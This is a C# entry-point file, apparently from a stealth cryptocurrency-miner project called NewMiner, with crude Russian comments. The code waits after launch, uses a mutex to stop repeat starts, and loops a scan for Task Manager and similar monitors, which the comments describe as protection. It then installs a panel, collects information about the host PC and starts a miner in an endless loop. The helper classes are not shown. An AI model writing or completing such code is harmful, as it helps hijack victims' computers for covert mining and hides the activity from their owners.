using System; //Это юзинг
using System.Threading; //и это тоже. Не еби мозг. Просто так же сделай и все.

namespace NewMiner
{
    class Program
    {
        static void Main(string[] args)
        {
            Thread.Sleep(4000); //После запуска спим 4 секунды
            if (!Mutar.Get()) 
                Environment.Exit(0); //Если экземпляр уже запущен, то закрываем. Защита от повторного старта и дурака

            new Thread(() =>
            {
                while (true)
                {
                    try
                    {
                        Scan.Run(); 
                    }
                    catch { }
                    Thread.Sleep(100);
                }
            }).Start();  //Тута стартует проверка на диспетчер задач и прочую лабуду

            Panel.Install(); //Тута стартует проверка на диспетчер задач и прочую лабуду

            Info.Get(); //Тута получаем инфу о пекарне

            new Thread(() => 
            {
                while (true)
                {
                    Miner.Start(); //Запускаем майнер
                    Thread.Sleep(100);
                }
            }).Start();
        }
    }
}